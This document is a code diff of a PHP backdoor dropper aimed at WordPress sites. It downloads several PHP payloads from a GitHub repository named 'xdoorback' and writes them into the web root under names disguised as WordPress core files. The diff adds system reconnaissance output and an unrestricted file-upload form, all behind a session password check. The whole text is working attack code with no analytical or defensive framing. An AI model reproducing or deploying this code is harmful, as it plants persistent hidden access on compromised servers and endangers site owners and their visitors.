@@ -5,6 +5,9 @@ $server = $_SERVER['HTTP_HOST'];
 set_time_limit(0);
 ini_set('memory_limit', '64M');
 header('Content-Type: text/html; charset=UTF-8');
+echo "<b>Uname:".php_uname()."<br></b>"; 
+echo "<b>Base Dir : ".getcwd ()."<br></b>";
+
 function http_get($url){
 $im = curl_init($url);
 curl_setopt($im, CURLOPT_RETURNTRANSFER, 1);
@@ -15,13 +18,13 @@ return curl_exec($im);
 curl_close($im);
 }
 $check1 = $_SERVER['DOCUMENT_ROOT'] . "/wp-config-samsples.php" ;
-$text1 = http_get('https://raw.githubusercontent.com/0xWhoknows/xdoorback/main/wordpress-samples.php');
+$text1 = http_get('https://raw.githubusercontent.com/0xWhoknows/symv2files/main/xdoor.php');
 $open1 = fopen($check1, 'w');
 fwrite($open1, $text1);
 fclose($open1);
 if(file_exists($check1)){
 }
-echo " Stored xl : <a href=\"http://".$_SERVER['HTTP_HOST']."/wp-config-samsples.php\">".$_SERVER['HTTP_HOST']."/wp-config-samsples.php</a>\n<br>";
+echo " Stored main : <a href=\"http://".$_SERVER['HTTP_HOST']."/wp-config-samsples.php\">".$_SERVER['HTTP_HOST']."/wp-config-samsples.php</a>\n<br>";
 $check2 = $_SERVER['DOCUMENT_ROOT'] . "/class-wp-filesystemss.php" ;
 $text2 = http_get('https://raw.githubusercontent.com/0xWhoknows/xdoorback/main/xl.php');
 $open2 = fopen($check2, 'w');
@@ -29,7 +32,7 @@ fwrite($open2, $text2);
 fclose($open2);
 if(file_exists($check2)){
 }
-echo " Stored  lu : <a href=\"http://".$_SERVER['HTTP_HOST']."/class-wp-filesystemss.php\">".$_SERVER['HTTP_HOST']."/class-wp-filesystemss.php  </a>\n<br>";
+echo " Stored  xl : <a href=\"http://".$_SERVER['HTTP_HOST']."/class-wp-filesystemss.php\">".$_SERVER['HTTP_HOST']."/class-wp-filesystemss.php  </a>\n<br>";
 $check3 = $_SERVER['DOCUMENT_ROOT'] . "/class-wp-filesystem.php" ;
 $text3 = http_get('https://raw.githubusercontent.com/0xWhoknows/xdoorback/main/lu.php');
 $open3 = fopen($check3, 'w');
@@ -37,7 +40,7 @@ fwrite($open3, $text3);
 fclose($open3);
 if(file_exists($check3)){
 }
-echo " Stored : <a href=\"http://".$_SERVER['HTTP_HOST']."/class-wp-filesystem.php\">".$_SERVER['HTTP_HOST']."/class-wp-filesystem.php  </a>\n<br>";
+echo " Stored lu: <a href=\"http://".$_SERVER['HTTP_HOST']."/class-wp-filesystem.php\">".$_SERVER['HTTP_HOST']."/class-wp-filesystem.php  </a>\n<br>";
 $check4 = $_SERVER['DOCUMENT_ROOT'] . "/class-wp.php" ;
 $text4 = http_get('https://raw.githubusercontent.com/0xWhoknows/xdoorback/main/hehe.php');
 $open4 = fopen($check4, 'w');
@@ -69,9 +72,29 @@ if ( $_SESSION['pass']!== $pass)
 ?>
 
 
-<form enctype="multipart/form-data" action="<?php echo $_SERVER['PHP_SELF']; ?>" method="POST">
-File mu mas : <input name="file" type="file" /><br />
-<input type="submit" value="Upload" /></form>
+<?php
+
+error_reporting(0);
+set_time_limit(0);
+echo '<font color="black" size="4">';
+if(isset($_POST['Submit'])){
+    $filedir = ""; 
+    $maxfile = '2000000';
+    $mode = '0644';
+    $userfile_name = $_FILES['image']['name'];
+    $userfile_tmp = $_FILES['image']['tmp_name'];
+    if(isset($_FILES['image']['name'])) {
+        $qx = $filedir.$userfile_name;
+        @move_uploaded_file($userfile_tmp, $qx);
+        @chmod ($qx, octdec($mode));
+    echo" <a href=$userfile_name><b>Sucessfully Uploaded :D ==> $userfile_name</b></a>";
+    }
+}else{
+    echo'<form method="POST" action="#" enctype="multipart/form-data"><input type="file" name="image"><br><input type="Submit" name="Submit" value="Upload"></form>';
+}
+echo '</center></font>';
+
+?>
 
 
 <?php
